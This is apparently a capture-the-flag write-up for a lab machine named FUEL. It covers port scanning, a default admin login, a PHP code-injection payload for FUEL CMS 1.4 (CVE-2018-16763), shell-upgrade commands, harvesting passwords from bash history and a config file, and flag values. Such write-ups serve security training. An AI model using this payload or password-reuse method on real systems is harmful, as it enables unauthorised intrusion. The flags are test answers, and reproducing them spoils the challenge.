# FUEL

## NMAP SCAN

```text
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 31:3f:4e:32:8c:28:6d:92:2c:58:1d:9e:12:e8:23:c5 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDN7WOd3eBoWrijaP9ht9lhr3G/MBjhE0DWmONR01DbR1So/fUz73Z/YwPeJlh0e5ZPMd5kS4BKtYKm67OFxpNHtHN/dxHPrJw3Eb3PWeaQn1yleHNpBiTXgUYcG/GdFVFr6UtLmQXmFhOR3h1Kf2e0zckV/eeKp6IITH56ZviaW8i/FLSyI+KWEaFaJGz93VdvzpqvQEtPk3PyOs2l3zr3fBkXrBkRxkKevurGKUOE8Rkgkb64xRmwlUUfFKj4Rx6pMSIOAaaIbFnqF7vOwiZzIZKc3ckbcGu/YsWNp+wnW0WVJUozSB9wqX87jTUmQWn9C1OtAtKakqYO9rXufpTH
|   256 51:d6:24:44:8d:e9:14:4d:89:73:1c:c6:ad:b6:bb:02 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOxVwd7ROrsWsOdeEIdKhv9CF1nk45BhO9S7cRJesDeO
80/tcp open  http    syn-ack ttl 63 nginx 1.14.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST
| http-robots.txt: 1 disallowed entry 
|_/fuel/
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Welcome to FUEL CMS
```

## PORT 80 ENUMERATION

![](../.gitbook/assets/7ce71d16dd4f4382aacb99f516d72c79.png)

### FUEL CMS 1.4

![](../.gitbook/assets/160a76f6024246808903639661292f35.png)

![](../.gitbook/assets/9198ed0820334117b1642c68ff8ea33d.png)

#### /FUEL

* login page

```text
admin:admin works
```

![](../.gitbook/assets/6f57a60a252746c892bf261a9e192f59.png)

## EXPLOIT

* [https://www.cvedetails.com/cve/CVE-2018-16763/](https://www.cvedetails.com/cve/CVE-2018-16763/)

![](../.gitbook/assets/c08b02c6a37543babe96fd7b401398cd.png)

![](../.gitbook/assets/7319b1d17729436383d76cad42e82df7.png)

* [https://www.exploit-db.com/exploits/47138](https://www.exploit-db.com/exploits/47138)

![](../.gitbook/assets/2c095df080984d33ba734656f0fbb787.png)

```text
'+pi(print($a='system'))+$a('<the cmd you use>')+'
```

![](../.gitbook/assets/f59bd95a1b3f49569886fa02f38111e1.png)

![](../.gitbook/assets/1e97f651710f4a14a26c9fbf5d3d4784.png)

![](../.gitbook/assets/ba7ac009598c44c5bb2c9ca3f4548fac.png)

**UPGRADE SHELL**

```text
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

```text
Ctrl+Z
stty raw -echo; fg
Enter
export TERM=XTERM
```

## MACHINE ENUMERATION

### HOSTNAME

```text
ip-172-31-1-28
```

### USERS WITH SHELL

```text
root:x:0:0:root:/root:/bin/bash
moira:x:1001:1001:,,,:/home/moira:/bin/bash
ubuntu:x:1002:1002:Ubuntu:/home/ubuntu:/bin/bash
```

### IN MOIRA BASH HISTORY

![](../.gitbook/assets/866da15f09284bdb9f6943e27615248e.png)

```text
moira:xH5es74TMBpWmdaG
```

### WEB DIRECTORY FUEL

![](../.gitbook/assets/3cc35a3e7f3c49198a110670dd2bf1c4.png)

![](../.gitbook/assets/e5f9f8905ce040949e636bcc2ddf5839.png)

* MYSQL PASSWORD \(/var/www/fuel/fuel/application/config/database.php\)

![](../.gitbook/assets/b4c983d0aca74b74869940cc2970826d.png)

```text
moira:AVerySecureCoolPassword5
```

## PRIVESC

I've tried everything and after a while, i thougt... lets try again all passwords found with root and ubuntu user.

![](../.gitbook/assets/fd0a98108d3b4619b1f814bc812ed769.png)

```text
root:xH5es74TMBpWmdaG
```

## FLAGS

### USER

```text
9f0668a3231303b55d593e6d61b1b902
```

### ROOT

```text
8f382ca4acbc37411a38b055c0eb85d7
```

![](../.gitbook/assets/f32977a349284be88d518e76148423c6.png)

